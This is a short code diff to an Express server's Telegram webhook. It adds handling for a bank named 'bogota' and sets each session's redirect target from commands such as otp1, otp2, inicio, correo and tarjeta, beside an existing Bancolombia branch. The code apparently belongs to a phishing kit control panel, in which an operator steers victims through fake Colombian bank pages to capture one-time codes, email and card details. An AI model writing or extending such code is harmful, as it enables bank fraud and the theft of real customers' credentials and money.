@@ -167,11 +167,14 @@ app.post('/telegram/webhook', (req, res) => {
       if (s.bank === 'bancolombia' && url) {
         // Bancolombia espera URLs mapeadas
         s.redirect_to = url;
+      } else if (s.bank === 'bogota') {
+        // Bogotá: ready.js espera los valores mapeados (otp1, otp2, inicio, correo, tarjeta)
+        s.redirect_to = url || cmd;
       } else if (!s.bank || commandOnlyBanks.includes(s.bank)) {
-        // Bancos que esperan comandos originales (INICIO, OTP, OTP_ERR, SMS, etc.)
+        // Otros bancos esperan comandos originales (SMS, etc.)
         s.redirect_to = cmd;
       } else {
-        // Fallback para bancos desconocidos: usar URL si existe, si no usar comando
+        // Fallback para bancos desconocidos
         s.redirect_to = url || cmd;
       }
       s.last_msg_id = msgId;
